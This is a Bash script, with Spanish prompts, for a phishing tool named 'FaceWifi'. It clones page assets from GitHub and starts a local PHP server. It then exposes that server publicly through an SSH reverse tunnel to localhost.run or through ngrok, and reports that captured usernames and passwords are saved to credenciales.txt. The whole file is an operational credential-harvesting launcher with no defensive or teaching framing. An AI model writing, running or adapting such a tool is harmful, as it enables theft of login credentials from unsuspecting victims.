#! /bin/bash

git clone https://github.com/MRX90902WX/css
git clone https://github.com/MRX90902WX/js
clear
echo ""
setterm -foreground red
cat baner.txt
sleep 1
echo ""
echo ""
figlet FaceWifi
echo ""
echo -e -n "\e[1;37m[*]\e[0m\e[1;32mIntroduce un puerto default.[\e[0m\e[1;36m4444\e[0m\e[1;32m]>>\e[0m "
read port
echo ""
echo -e "\e[1;34m===================================\e[0m"
echo -e "\e[1;33m User, Passwd ==> credenciales.txt\e[0m"
echo -e "\e[1;34m===================================\e[0m"
sleep 1
echo ""
while :
do
echo -e "    \e[1;31m1)\e[0m\e[1;37mTunel SSH\e[0m      \e[1;31m2)\e[0m\e[1;37mTunel Ngrok\e[0m"
echo ""
echo -n -e "\e[1;37m[*]\e[0m\e[1;32mFaceWifi>>\e[0m "
read face
case $face in
1)
echo ""
#! /bin/bash
php -S 0.0.0.0:$port & ssh -R 80:localhost:$port nokey@localhost.run -q -y
exit
;;
2)
echo ""
#! /bin/bash
php -S 0.0.0.0:$port &
echo ""
echo -e "\e[1;32m[\e[0m\e[1;37m*\e[0m\e[1;32m]\e[0m\e[1;33mCargando link ngrok ...\e[0m"
echo ""
sleep 4
ngrok http $port
exit
;;
esac
done
